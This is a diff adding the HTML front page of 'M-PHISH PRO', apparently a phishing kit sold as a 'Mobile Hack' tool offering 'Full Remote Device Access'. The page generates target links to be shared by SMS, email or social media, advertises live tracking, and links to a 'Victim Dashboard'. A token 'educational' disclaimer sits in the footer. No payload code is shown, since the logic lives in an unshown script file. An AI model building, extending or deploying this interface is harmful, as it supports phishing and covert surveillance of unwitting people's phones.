@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobile Access Tool</title>
+    <meta name="theme-color" content="#0a0a0f">
+    <link rel="stylesheet" href="assets/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+<body>
+
+    <!-- ====== ANIMATED MATRIX BG ====== -->
+    <canvas id="matrixCanvas"></canvas>
+
+    <!-- ====== MAIN CONTAINER ====== -->
+    <div class="container" id="mainContainer">
+
+        <!-- HEADER -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-haltered"></i>
+                </div>
+                <div class="logo-text">
+                    <h1>M-PHISH <span class="pro-badge">PRO</span></h1>
+                    <p class="subtitle">Mobile access Tool v2.0</p>
+                </div>
+            </div>
+            <div class="status-badge">
+                <span class="status-dot"></span>
+                <span class="status-text">SYSTEM READY</span>
+            </div>
+        </header>
+
+        <!-- BANNER SECTION -->
+        <section class="banner-section">
+            <div class="banner-glow"></div>
+            <div class="banner-content">
+                <div class="banner-icon">
+                    <i class="fas fa-robot"></i>
+                </div>
+                <h2 class="banner-title">MOBILE HACK</h2>
+                <div class="typing-container">
+                    <span class="typing-text" id="typingText"></span>
+                    <span class="cursor-blink">|</span>
+                </div>
+                <p class="banner-desc">Full Remote Device Access</p>
+            </div>
+        </section>
+
+        <!-- DEVELOPER CREDIT -->
+        <div class="developer-credit">
+            <div class="credit-badge">
+                <i class="fas fa-crown"></i>
+                <span>Developer</span>
+            </div>
+            <h3 class="developer-name">Nawab Zada Hacker</h3>
+            <div class="dev-tags">
+                <span class="tag">white hat team</span>
+                <span class="tag">Exploit Dev</span>
+                <span class="tag">OSINT</span>
+                <span class="tag">Pentest</span>
+            </div>
+        </div>
+
+        <!-- SELECTION GRID -->
+        <section class="selection-section">
+            <h2 class="section-title">
+                <i class="fas fa-crosshairs"></i>
+                Select Assessment Module
+            </h2>
+
+            <div class="modules-grid" id="modulesGrid">
+                <!-- Module cards will be rendered by Nawab Zada -->
+            </div>
+        </section>
+
+        <!-- LINK GENERATOR SECTION -->
+        <section class="generator-section" id="generatorSection">
+            <div class="glass-card">
+                <div class="generator-header">
+                    <i class="fas fa-link"></i>
+                    <h3>Generate target Link</h3>
+                </div>
+
+                <div class="generator-body">
+                    <div class="selected-module-display">
+                        <span class="label">Selected Module:</span>
+                        <span class="value" id="selectedModuleDisplay">None</span>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="targetName">
+                            <i class="fas fa-tag"></i> Campaign Name (optional)
+                        </label>
+                        <input type="text" id="targetName" placeholder="e.g. Assessment-2026-07" maxlength="50">
+                    </div>
+
+                    <button class="generate-btn" id="generateBtn" disabled>
+                        <span class="btn-shimmer"></span>
+                        <i class="fas fa-skull"></i>
+                        <span class="btn-text">Generate Link for Mobile Hack</span>
+                    </button>
+
+                    <div class="link-output" id="linkOutput" style="display:none;">
+                        <div class="link-display">
+                            <input type="text" id="generatedLink" readonly>
+                            <button class="copy-btn" id="copyBtn">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="link-info">
+                            <i class="fas fa-info-circle"></i>
+                            <span>Link expires in 24 hours. Share via SMS, email, or social media.</span>
+                        </div>
+                        <div class="link-stats">
+                            <div class="stat">
+                                <i class="fas fa-qrcode"></i>
+                                <span>QR Code Ready</span>
+                            </div>
+                            <div class="stat">
+                                <i class="fas fa-chart-line"></i>
+                                <span>Live Tracking Active</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- DASHBOARD LINK -->
+        <div class="dashboard-link-container">
+            <a href="dashboard.html" class="dashboard-btn">
+                <i class="fas fa-tachometer-alt"></i>
+                <span>Open Victim Dashboard</span>
+                <i class="fas fa-arrow-right"></i>
+            </a>
+        </div>
+
+        <!-- FOOTER -->
+        <footer class="footer">
+            <p>⚠️ only for educational perpose</p>
+            <p class="footer-small">Mobile Access v2.0 • Nawab Zada Hacker •</p>
+        </footer>
+    </div>
+
+    <script src="assets/script.js"></script>
+</body>
+</html>
